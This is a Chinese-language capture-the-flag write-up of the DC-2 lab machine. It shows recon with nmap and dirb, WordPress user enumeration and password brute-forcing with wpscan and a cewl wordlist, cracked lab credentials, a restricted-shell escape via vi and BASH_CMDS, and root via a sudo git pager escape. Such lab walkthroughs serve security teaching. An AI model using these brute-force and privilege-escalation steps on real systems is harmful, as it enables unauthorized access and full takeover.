# DC2

配置环境vmware17 + nat网络配置

下载地址:[DC and Five86 Series Challenges - DC-1](https://www.five86.com/dc-1.html)

（似乎从2024/1/18左右找不到这个资源了）

攻击机kali与其在同一网段下 ip:192.168.52.130

### 信息收集

```bash
arp-scan -l #内网探测，扫描目标ip
```

![image-20240119134743828](http://111.229.225.13:81/i/2024/01/19/maaauz-2.png)

发现**目标ip**192.168.52.130

使用nmap对目标进行扫描

```bash
nmap -T4 -sV -O -A -Pn -p- 192.168.52.130
```

![image-20240119134857209](http://111.229.225.13:81/i/2024/01/19/mawt5q-2.png)

发现开放端口80，7744

### 重定向

先访问80的http服务

![image-20240119135004267](http://111.229.225.13:81/i/2024/01/19/mbsa46-2.png)

这里域名跳转了，但是显示找不到此网站，挂上burpsuite，抓包查看情况

```
HTTP/1.1 301 Moved Permanently
Date: Thu, 18 Jan 2024 20:05:59 
Server: Apache/2.4.10 (Debian)
Location: http://dc-2/
Content-Length: 0
Connection: close
Content-Type: text/html; charset=UTF-8
```

工具数据包可知，网站回复301状态码，永久重定向

通过修改host文件，将ip地址和dc-2域名强行绑定，（host可以简单理解为对域名的解析处理，解析手动指定的ip地址，以便于绕过dns查询）

![image-20240119135659751](http://111.229.225.13:81/i/2024/01/19/mfxsk7-2.png)

**去掉**这个勾选只读

然后用vscode打开host文件，在最底层添加一个

```
192.168.52.130 dc-2
```

![image-20240119135856497](http://111.229.225.13:81/i/2024/01/19/mgv60c-2.png)

此时直接打开网站

![image-20240119140006811](http://111.229.225.13:81/i/2024/01/19/n5kwov-2.png)

点开右上角的Flag

![image-20240119140058737](http://111.229.225.13:81/i/2024/01/19/n64dob-2.png)

可以发现这是一个使用wordpress搭建的网站

### 工具探测

flag中推荐使用cewl工具（一种使用ruby写的爬虫工具，可以爬取网站中的敏感信息组成字典，kali中自动集成了）

```ruby
cewl http://dc-2 -w passwd.txt
```

![image-20240119141518395](http://111.229.225.13:81/i/2024/01/19/nekk22-2.png)

![image-20240119141546471](http://111.229.225.13:81/i/2024/01/19/neqqhq-2.png)

再使用dirb挖掘目录信息

```ruby
dirb http://dc-2/
```

![image-20240119141926357](http://111.229.225.13:81/i/2024/01/19/nh08wn-2.png)

发现一个url 

```http
http://dc-2/wp-admin/admin.php 
```

这个url是wordpress搭建的网站的登录页面

![image-20240119142053812](http://111.229.225.13:81/i/2024/01/19/nhreme-2.png)

关于wordpress搭建的站点，有一个非常好的工具，wpscan，可以利用其扫描功能对其测试

```bash
wpscan --url http://dc-2/ -e u      //枚举用户名字
```

![image-20240119142616441](http://111.229.225.13:81/i/2024/01/19/nl46n6-2.png)

将这些人名写入文件中

```bash
echo "admin" >> usr.txt
echo "jerry" >> usr.txt
echo "tom" >> usr.txt
```

利用wpscan爆破账号密码

```bash
wpscan --url http://dc-2/ -U usr.txt -P passwd.txt
```

![image-20240119143702773](http://111.229.225.13:81/i/2024/01/19/nrl269-2.png)



```
jerry / adipiscing
tom / parturient
```

分别利用进行登录

登录后如果是空白，再重新输入一下urlhttp://dc-2/wp-admin/即可

![image-20240119144036235](http://111.229.225.13:81/i/2024/01/19/ntkc9z-2.png)

flag2的意思：在此wordpress中找不到有用的信息了，尝试其他方法

### 内网提权

之前nmap扫描时发现了一个7744端口的ssh服务

#### vi提权

基于此尝试ssh连接

```bash
ssh tom@192.168.52.130 -p 7744
```

这里只有tom的账号密码对了

![image-20240119144345152](http://111.229.225.13:81/i/2024/01/19/nvejb0-2.png)

同时发现很多命令无法使用

![image-20240119154905083](http://111.229.225.13:81/i/2024/01/19/pma3mf-2.png)

```bash
compgen -c       //查看可以使用的指令
```

![image-20240119155752801](http://111.229.225.13:81/i/2024/01/19/prbimp-2.png)

发现可以使用vi命令,此命令存在提权（本质上属于sudo提权）

先查看提示

```bash
vi flag3.txt
```

![image-20240119155933240](http://111.229.225.13:81/i/2024/01/19/psed9c-2.png)

先提权然后查看jerry账号

操作步骤

```bash
vi随便打开文件
输入:
再下面添加
:set shell=/bin/sh
:shell
```

![image-20240119164803845](http://111.229.225.13:81/i/2024/01/19/r97hn0-2.png)

按回车，再次输入:

![image-20240119164829571](http://111.229.225.13:81/i/2024/01/19/r9d61l-2.png)

![image-20240119164842649](http://111.229.225.13:81/i/2024/01/19/r9fz6a-2.png)

这时可以使用cd命令了，cd ..找到上一层目录，进入Jerry文件夹下发现flag4，使用vi flag4.txt查看

![image-20240119165113867](http://111.229.225.13:81/i/2024/01/19/rb2e03-2.png)

权限过低，想办法提权

#### rbash环境变量

先使用exit退出

```bash
export -p        //查看环境变量
BASH_CMDS[a]=/bin/sh;a         //把/bin/sh给a
/bin/bash
export PATH=$PATH:/bin/         //添加环境变量
export PATH=$PATH:/usr/bin      //添加环境变量
```

![image-20240119170254942](http://111.229.225.13:81/i/2024/01/19/s5nuid-2.png)

发现以及可以使用被限制的命令了

```bash
find / -perm -u=s -type f 2>/dev/null //找到存在sudo权限的命令
```

![image-20240119170423065](http://111.229.225.13:81/i/2024/01/19/s6o0hv-2.png)

切换用户

```bash
su jerry 
```

#### git提权

查看sudo权限

```bash
sudo -l
```

![image-20240119172000450](http://111.229.225.13:81/i/2024/01/19/sg26ct-2.png)

可以发现git命令存在sudo提权

基于此进行权限提升

方式：

```bash

sudo git help config #在末行命令模式输入 
!/bin/bash 或 !'sh' #完成提权 
sudo git -p help 
!/bin/bash #输入!/bin/bash，即可打开一个用户为root的shell
```

输入sudo git help config后会有一个很长的文本，在此基础上，按下: ，在输入!/bin/bash

然后按q退出,再输出sudo git -p help命令，同上输入!/bin/bash

![image-20240119172321933](http://111.229.225.13:81/i/2024/01/19/shywb4-2.png)

![image-20240119172502115](http://111.229.225.13:81/i/2024/01/19/sj1oh1-2.png)

![image-20240119172527354](http://111.229.225.13:81/i/2024/01/19/sj6rzf-2.png)

至此结束

### 总结

1、hosts文件指定ip对应域名

2、工具使用：cewl（收集网站字典）、dirb(目录探测)、wpscan(针对wordpress制作的扫描工具)

3、linux命令 

```bash
compgen -c #查看当前可用命令
find / -perm -u=s -type f 2>/dev/null #查找存在sudo权限的命令
sudo -l #查看当前用户可使用的sudo权限
```

4、权限提升：vi提权，rbash环境变量提权，git提权